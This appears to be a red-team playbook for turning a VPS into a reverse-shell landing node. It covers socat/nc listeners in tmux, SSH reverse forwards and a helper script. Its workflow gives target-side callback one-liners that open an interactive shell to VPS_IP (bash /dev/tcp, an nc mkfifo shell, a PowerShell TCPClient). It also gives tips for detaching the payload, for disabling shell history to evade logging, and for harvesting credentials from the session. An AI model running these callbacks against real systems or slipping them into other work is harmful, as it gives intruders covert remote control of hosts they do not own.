# VPS Reverse Shell: Landing Node, Listeners and Reverse Forwards

Turns `VPS_IP` into the landing node for everything the target sends outward: a raw reverse TCP shell terminated by `socat` or `nc` inside `tmux`, and SSH reverse forwards that publish an internal port on the VPS without any inbound path to the target. The helper `$DSH_HOME/redteam/toolkit/vps/vps.sh` wraps `ssh`/`scp` with the dedicated key `$DSH_HOME/redteam/toolkit/vps/id_rsa`, so every action against the VPS is one short command and the key never varies. Listener output lands in `RESULT_DIR`, sessions in `tmux`, and the resulting channel is recorded as a `tunnel` row with `entry_kind=target-outbound`.

## When to use

- The target can reach the internet but nothing can reach the target, so a callback is the only reliable interactive channel.
- You want a stable shell that survives a dropped browser tab: the listener lives on the VPS in `tmux`, not on this workstation.
- An internal service on `TARGET_IP:PORT` must be reachable from here, and an `ssh -R` forward through the VPS is the least invasive way to publish it.
- Several operators need to share one landing node and one set of ports.
- Not for a pivot into a routed network where full IP semantics are needed — that is `ligolo-proxy`.
- Not a substitute for a persistent implant; this is an interactive landing node, and a host reboot ends it.

## Prerequisites

- Key material: `$DSH_HOME/redteam/toolkit/vps/id_rsa` created once by `bash $DSH_HOME/redteam/setup.sh --yes`; if setup was unavailable, generate locally with `ssh-keygen -t ed25519 -f $DSH_HOME/redteam/toolkit/vps/id_rsa -N ""` and append the `.pub` to the VPS `authorized_keys`.
- `chmod 600` on the private key — anything looser makes `ssh` refuse silently with `Permissions 0644 ... too open`.
- Firewall: `22` inbound for SSH and `9000-9999` inbound for callbacks, opened in the cloud security group as well as any host firewall on the VPS.
- VPS identity with defaults, so a missing variable degrades instead of failing:

```bash
set -a; . "$DSH_HOME/.env" 2>/dev/null; set +a
VPS_HOST="${VPS_HOST:-root@VPS_IP}"
VPS_PORT="${VPS_PORT:-22}"
```

  The Python form when scripting is `os.environ.get("VPS_HOST", "")`.
- Every step has a fallback and none is mandatory. No VPS → use a public redirector or the target's own egress through `suo5-tunnel`. No `socat` on the VPS → `nc -lvnp` works for a shell, just without pty. `ssh -R` blocked by `AllowTcpForwarding no` → fall back to the socket listener.
- Nothing on the workstation is required except `ssh`; all listeners run on the VPS.

## Workflow

1. Prove the key, the user and the port in one command before anything else. A one-word answer is the whole test.

```bash
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes -o ConnectTimeout=8 \
  "$VPS_HOST" 'echo ok'
```

   `ok` → proceed. `Permission denied (publickey)` → wrong user or the public key is not in `authorized_keys`. `Connection timed out` → security group or a wrong `VPS_IP`.

2. Provide the helper if it is absent — this is the reference implementation, and any subset of it is enough to work with.

```bash
cat > $DSH_HOME/redteam/toolkit/vps/vps.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
KEY="$DSH_HOME/redteam/toolkit/vps/id_rsa"
HOST="${VPS_HOST:-root@VPS_IP}"
SSHOPTS=(-i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10)
ssh_vps() { ssh "${SSHOPTS[@]}" "$HOST" "$@"; }
action="${1:-}"; shift || true
case "$action" in
  ping)  ssh_vps 'echo ok' ;;
  exec)  ssh_vps "$@" ;;
  push)  scp -i "$KEY" -o BatchMode=yes "$1" "$HOST:$2" ;;
  serve) p="${1:?port}"; ssh_vps "mkdir -p ~/logs; tmux has-session -t l$p 2>/dev/null || tmux new -d -s l$p 'socat -d -d TCP-LISTEN:$p,reuseaddr,fork STDOUT,pty,raw,echo=0 2>&1 | tee -a ~/logs/l$p.log'" ;;
  stop)  p="${1:?port}"; ssh_vps "tmux kill-session -t l$p 2>/dev/null || true" ;;
  *) echo "usage: vps.sh {ping|exec|push|serve <port>|stop <port>}" >&2; exit 2 ;;
esac
EOF
chmod +x $DSH_HOME/redteam/toolkit/vps/vps.sh
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes "$VPS_HOST" 'command -v socat tmux nc'
```

3. Start the listener as a detached `tmux` session on the VPS, not in the foreground of a background process here — a lost terminal must not kill it.

```bash
$DSH_HOME/redteam/toolkit/vps/vps.sh serve LISTEN_PORT
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes "$VPS_HOST" \
  "ss -lntp | grep ':LISTEN_PORT'; tmux ls"
```

   One `LISTEN` line on `LISTEN_PORT` and one `lLISTEN_PORT` session is the ready state. `socat ... fork` accepts a fresh session after the first one dies, so the port stays usable.

4. Target side: send the callback. Use the shortest form that the shell on the target supports, and prefer one that detaches so the parent process does not reap it.

```bash
setsid bash -c 'bash -i >& /dev/tcp/VPS_IP/LPORT 0>&1' &
# alternative when bash lacks /dev/tcp
setsid sh -c 'rm -f /tmp/.x; mkfifo /tmp/.x; cat /tmp/.x | sh -i 2>&1 | nc VPS_IP LPORT > /tmp/.x'
# alternative for a PowerShell foothold
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('VPS_IP',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};..."
```

5. Confirm on the VPS and take the first identity read before doing anything else with the shell.

```bash
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes "$VPS_HOST" \
  "tail -30 ~/logs/lLISTEN_PORT.log; ss -tnp | grep ':LISTEN_PORT'"
```

   Inside the session: `id; hostname; uname -a; ps -p $$ -o pid,ppid,cmd`. That output is the evidence for the tunnel row.

6. When a service rather than a shell is the goal, publish it with a reverse forward instead of a listener. This keeps the target's outbound-only posture and needs no payload.

```bash
# on the host that can reach TARGET_IP, using a key it can read
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes \
  -R 0.0.0.0:LPORT:TARGET_IP:PORT -N -f "$VPS_HOST"
# verify from the VPS
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes "$VPS_HOST" \
  "ss -lntp | grep ':LPORT'"
```

   For a non-loopback bind the VPS `sshd_config` needs `GatewayPorts clientspecified`; without it the forward binds `127.0.0.1` only and `-L` through SSH still works.

7. Consume the published port from this workstation through the VPS, never by exposing it to the internet.

```bash
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -N -L 127.0.0.1:LHOST:VPS_IP:LPORT "$VPS_HOST" &
curl -s --max-time 8 http://127.0.0.1:LHOST/ | head -20
```

8. Record the channel immediately, then keep the session in `tmux` and the log on the VPS so a second operator can pick it up.

```text
redteam_tunnel_add  kind=ssh-r  listen=VPS_IP:LPORT  entry=ssh -R 0.0.0.0:LPORT:TARGET_IP:PORT  reach=TARGET_IP  entry_kind=target-outbound
redteam_tunnel_add  kind=other  listen=VPS_IP:LISTEN_PORT  entry=setsid bash -c 'bash -i >& /dev/tcp/VPS_IP/LPORT 0>&1'&  entry_kind=target-outbound
```

## Output and evidence

- `RESULT_DIR/vps-LPORT-shell.log` — pulled copy of `~/logs/lLISTEN_PORT.log`; the operator transcript for the session.
- `RESULT_DIR/vps-connectivity.txt` — the `echo ok` result, key fingerprint and `ss -lntp` snapshot; the proof the landing node was ready before the target connected.
- `RESULT_DIR/vps-LPORT-forward.txt` — `ssh -R` invocation and the VPS `ss -lntp` line showing the published port.
- `redteam_tunnel_add` with `kind=ssh-r` for the reverse forward, `kind=other` for a raw reverse TCP shell; `listen` is always the VPS-side `host:port`, `entry_kind=target-outbound`, `reach` names what the channel actually reaches.
- `redteam_credential_add` when the session yields a reusable secret (SSH key, database password), with `secret_ref` pointing at the file that holds it and never the value itself in a report.
- `redteam_evidence_record` with `operation=vps_reverse_shell`, `authority=tool-output`, `confidence=observed`, the `id`/`hostname` lines plus the timestamp of the listener log inside `result`.
- `redteam_asset_add` for the target with `provenance=active`, `tool=vps-reverse-shell`, and `state` reflecting what the shell proved.
- `redteam_attack_file_add` the exact callback one-liner as `kind=script` once it produced a session, so it can be replayed instead of re-derived.

## Failure modes

- `Connection timed out` from the target's callback → `9000-9999` is closed in the security group, or the target has no route to `VPS_IP` → test with `nc -vz VPS_IP LPORT` from the target and open the range.
- `Connection refused` from the VPS side of the listener → nothing is bound on that port (session died, or `socat` missing) → `vps.sh serve LPORT` again and check `command -v socat`.
- Shell appears then dies within seconds → the payload was not detached and the parent reaped it → wrap in `setsid` and redirect all three streams.
- No job control, no `Ctrl-C`, no prompt → no pty was allocated → `socat ... STDOUT,pty,raw,echo=0` on the VPS, then `stty raw -echo` on the client side.
- `Permission denied (publickey)` → wrong `VPS_HOST` user, key not in `authorized_keys`, or `chmod` too open → re-test with `-i` explicit and `ssh -v` once.
- `Host key verification failed` → the VPS was rebuilt and the old key is cached → `ssh-keygen -R VPS_IP` then reconnect with `StrictHostKeyChecking=accept-new`.
- `Warning: remote port forwarding failed for listen port LPORT` → the port is taken on the VPS, or `GatewayPorts` is off → pick another port in `9000-9999` and confirm the `sshd_config` directive.
- `bind: Address already in use` from `socat` → a previous listener still holds the port → `tmux ls`, `vps.sh stop LPORT`, `ss -lntp`.
- Callback works once and never again → `socat` was started without `fork`, or a `nc -lvnp` single-shot listener exited → restart with `fork` and verify the process is still alive after the first session ends.

## Notes

- One landing node, many channels. Use a distinct port per channel and name sessions `l<port>` so the VPS is self-documenting.
- Rate: a reverse shell is an interactive channel, so do not drive scans through it. Keep `THREADS=1` and `RATE` low if you pipe anything bulk through it; a shell over TCP is not a proxy.
- Opsec: connections originate from the target to a stable VPS address — keep that address constant during an engagement, avoid a rotating callback domain, and never reuse a port for two hosts. `unset HISTFILE` and `export HISTFILE=/dev/null` inside the session stop the target from logging your commands.
- Idempotency: `vps.sh serve` is safe to repeat because it checks `tmux has-session` first. Repeating the callback payload creates a second session on the same port — check `ss -tnp` before resending.
- Resume: after a dropped session the `socat` listener is still bound and accepts the next callback. After a VPS reboot nothing survives; re-run `vps.sh serve` and resend the payload.
- Cleanup: `vps.sh stop LPORT`, `tmux kill-server` if you own the VPS, delete uploaded payloads and `/tmp/.x` fifo on the target, close the `9000-9999` rule if it is no longer needed, rotate the key if the private half was ever copied off this machine, and `redteam_tunnel_update` with `id` and `status=down`.
